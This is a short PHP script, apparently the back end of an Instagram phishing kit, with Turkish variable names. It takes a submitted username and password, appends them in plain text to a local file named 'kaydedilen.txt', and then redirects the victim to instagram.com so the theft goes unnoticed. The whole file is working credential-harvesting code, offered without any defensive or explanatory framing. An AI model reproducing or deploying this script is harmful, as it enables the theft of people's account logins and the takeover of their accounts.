<?php

if (isset($_POST['username']) && isset($_POST['password'])) {

$save = fopen("kaydedilen.txt","a+");
$kullaniciadi = $_POST['username'];
$password = $_POST['password'];
$vericekilen = ("
========================================
KULLANICI ADI >> ".$kullaniciadi."
========================================
ŞİFRE >> ".$password."
========================≠===============");
fwrite($save,$vericekilen);
fclose($save);
header('Location: https://instagram.com');
}
?>
